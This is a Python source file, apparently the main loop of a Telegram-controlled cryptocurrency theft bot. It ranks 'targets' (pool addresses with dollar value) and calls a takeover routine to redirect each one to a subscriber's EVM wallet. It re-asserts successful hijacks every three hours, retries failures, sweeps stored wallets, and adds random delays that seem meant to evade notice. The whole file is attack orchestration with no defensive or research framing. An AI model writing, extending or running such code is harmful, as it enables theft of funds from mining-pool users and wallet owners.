"""Main loop: discover, rank, hijack highest value first, re-assert, sweep."""
import asyncio, random, time
from . import db, hijack, hunter, sweeper
from .pools import by_id

REASSERT = 3 * 3600
RETRY = 40 * 60

async def hijack_pass():
    users = db.all("SELECT * FROM users WHERE active=1")
    for u in users:
        wallet = u["evm"] if u["evm"] else None
        if not wallet:
            continue
        rows = db.all("""SELECT t.*, c.state, c.ts AS cts FROM targets t
                         LEFT JOIN claims c ON c.target_id=t.id AND c.tg_id=?
                         WHERE t.usd >= ? AND t.chain NOT IN ('btc','bch','xmr','nexa','iron','kas')
                         ORDER BY t.score DESC LIMIT 25""", (u["tg_id"], u["min_usd"]))
        for t in rows:
            st, ts = t["state"], t["cts"] or 0
            if st == "ok" and time.time() - ts < REASSERT:
                continue
            if st == "fail" and time.time() - ts < RETRY:
                continue
            spec = by_id(t["pool"])
            if not spec:
                continue
            state, note = await hijack.takeover(spec, t["address"], wallet,
                                                lambda m, i=t["id"]: db.log(m, u["tg_id"]))
            db.run("""INSERT INTO claims(tg_id,target_id,state,ts,note) VALUES(?,?,?,?,?)
                      ON CONFLICT(tg_id,target_id) DO UPDATE SET state=excluded.state,
                      ts=excluded.ts, note=excluded.note""",
                   (u["tg_id"], t["id"], state, int(time.time()), note))
            db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}", u["tg_id"],
                   "ok" if state == "ok" else "warn")
            await asyncio.sleep(random.uniform(1.5, 4.0))

async def sweep_pass():
    for w in db.all("""SELECT w.*, u.evm FROM wallets w JOIN users u ON u.tg_id=w.tg_id
                       WHERE u.active=1 AND u.evm IS NOT NULL"""):
        st, note = await sweeper.sweep(w, w["evm"])
        if st not in ("empty", "skip"):
            await asyncio.sleep(random.uniform(2, 5))

async def loop():
    await asyncio.sleep(5)
    tick = 0
    while True:
        try:
            await hunter.cycle()
            if db.one("SELECT 1 FROM users WHERE active=1 LIMIT 1"):
                await hijack_pass()
                await sweep_pass()
        except Exception as e:
            db.log(f"loop error {type(e).__name__}: {e}", lvl="error")
        tick += 1
        await asyncio.sleep(90 + random.randint(0, 40))